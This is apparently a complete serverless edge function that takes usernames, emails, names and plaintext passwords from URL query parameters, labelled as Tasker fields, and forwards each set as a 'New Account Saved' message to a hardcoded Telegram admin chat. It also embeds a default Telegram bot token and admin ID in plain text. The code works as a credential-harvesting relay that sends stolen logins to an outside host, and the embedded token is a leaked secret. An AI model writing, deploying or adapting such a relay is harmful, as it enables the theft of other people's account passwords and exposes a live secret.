export const config = {
  runtime: "edge",
};

// DEFAULT VALUES (fallback)
const DEFAULT_BOT_TOKEN = "7926446040:AAGIpJglh2oeuAbOWxACmyEY0VsTg6Irp_I";
const DEFAULT_ADMIN_ID = "7183111659";

// =========================
// SEND TELEGRAM MESSAGE
// =========================
async function sendMessage(token, chatId, text, msg_id = null) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const body = {
    chat_id: chatId,
    text: text,
    parse_mode: "Markdown",
  };

  // optional reply to message
  if (msg_id) {
    body.reply_to_message_id = msg_id;
  }

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });
}

// =========================
// MAIN HANDLER
// =========================
export default async function handler(req) {
  const { searchParams } = new URL(req.url);

  // =========================
  // GET PARAMS (WITH FALLBACK)
  // =========================
  const BOT_TOKEN = searchParams.get("token") || DEFAULT_BOT_TOKEN;
  const ADMIN_ID = searchParams.get("admin_id") || DEFAULT_ADMIN_ID;
  const MSG_ID = searchParams.get("msg_id");

  const username = searchParams.get("login");   // %LOGIN
  const email = searchParams.get("mail");       // %MAIL
  const name = searchParams.get("name");        // %NAME
  const password = searchParams.get("pass");    // %PASS

  // =========================
  // ACCOUNT DATA RECEIVE
  // =========================
  if (email || password || username) {

    const msg =
`📥 *New Account Saved*

👤 *Username:* \`${username || "N/A"}\`
📛 *Name:* \`${name || "N/A"}\`
📧 *Email:* \`${email || "N/A"}\`
🔑 *Password:* \`${password || "N/A"}\`

━━━━━━━━━━━━━━
📡 *Status:* Saved via Tasker
⚡ *Runtime:* Edge API`;

    await sendMessage(BOT_TOKEN, ADMIN_ID, msg, MSG_ID);

    return new Response("saved");
  }

  // =========================
  // TELEGRAM WEBHOOK
  // =========================
  if (req.method === "POST") {
    const update = await req.json();
    const message = update.message;

    if (message?.text === "/start") {
      const reply =
`🤖 *Bot Online*

Ready to receive Tasker data.

⚡ Status: *Working*`;

      await sendMessage(BOT_TOKEN, message.chat.id, reply);
    }

    return new Response("ok");
  }

  return new Response("API Running");
}
